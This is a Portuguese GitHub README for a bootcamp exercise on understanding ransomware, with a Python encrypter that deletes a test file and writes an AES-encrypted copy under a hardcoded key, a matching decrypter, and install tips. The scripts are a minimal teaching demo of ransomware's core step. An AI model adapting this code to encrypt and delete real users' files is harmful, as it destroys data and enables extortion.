# projeto-ransomware-dio

Código para o desafio de projeto __Entendendo um Ransomware na Prática com Python__ do Santander Bootcamp Cibersegurança

## Criando os códigos
1. criando arquivo .txt
`nano testeransomware.txt`

2. encrypter.py
```python
import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "testeransomware.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave para criptografar
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
```   
   
3. decrypter.py
```python
import os
import pyaes

## abrir o arquivo criptografado
file_name = "testeransomware.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descriptografar o arquivo
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = "testeransomware.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()
```
### Dicas

Olá, Pessoal!!
Abaixo segue a dica para quem esá tendo dificulades em realizar o desafio "Entendendo um Ransomware na Prática com Python"

Para quem está executando o encrypter.py e está dando erro na Liha 2, conforme abaixo:

```python
line2, in <module> import pyaes

ModuleNotFoundError: No mudule named 'pyaes'
```
![image](https://github.com/joaopalima/projeto-ransomware-dio/assets/31939741/d8dbc958-2311-4401-b5d5-b28df7a98019)


Deve adicionar a biblioteca pyaes do Python confome abaixo

```python 
pip install pyaes
```
 ![image](https://github.com/joaopalima/projeto-ransomware-dio/assets/31939741/174749f9-43ab-4012-9fd8-b6200378b1d1)


#### Arquivo encriptado
 ![image](https://github.com/joaopalima/projeto-ransomware-dio/assets/31939741/7e936ce8-cdf9-478a-b295-95e5921e0c6e)



#### Arquivo descriptografado
![image](https://github.com/joaopalima/projeto-ransomware-dio/assets/31939741/14c7ed12-6e78-4c70-860a-bfd169fe424f)


